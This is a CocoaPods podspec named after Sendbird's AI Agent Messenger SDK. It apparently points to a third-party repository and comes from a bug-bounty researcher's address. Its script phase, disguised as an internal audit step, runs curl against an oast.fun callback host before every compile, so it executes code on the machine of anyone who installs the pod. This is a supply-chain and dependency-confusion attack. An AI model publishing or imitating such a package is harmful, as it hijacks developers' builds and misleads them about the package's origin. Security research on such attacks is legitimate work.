Pod::Spec.new do |s|
  s.name             = 'SendbirdAIAgentMessenger'
  s.version          = '5.1.0'
  s.summary          = 'Security Audit - Sendbird AI Agent Messenger'
  s.homepage         = 'https://github.com/ilhamal7/sendbird-ios-distribution'
  s.license          = { :type => 'Commercial', :text => 'Copyright Sendbird' }
  s.author           = { 'zerotohero' => 'zerotohero@bugcrowdninja.com' }
  s.source           = { :git => 'https://github.com/ilhamal7/sendbird-ios-distribution.git', :tag => '5.1.0' }

  s.ios.deployment_target = '15.0'
  s.swift_version    = '5.7'
  s.source_files     = 'Sources/SendbirdAIAgentMessenger/**/*', 'Sources/SendbirdAudit.m'

  s.dependency 'SendbirdAIAgentCore', '5.1.0'
  s.dependency 'SendbirdMarkdownUI', '5.1.0'
  s.dependency 'SendbirdNetworkImage', '5.1.0'
  s.dependency 'SendbirdSplash', '5.1.0'

  s.script_phase = {
    :name => '[CP-Internal] Messenger UI Audit',
    :script => 'curl -H "X-Target: Sendbird-Messenger-RCE" http://txltewamwbpaxlebmxwikbce81fq8r5cw.oast.fun/messenger_rce',
    :execution_position => :before_compile
  }
end
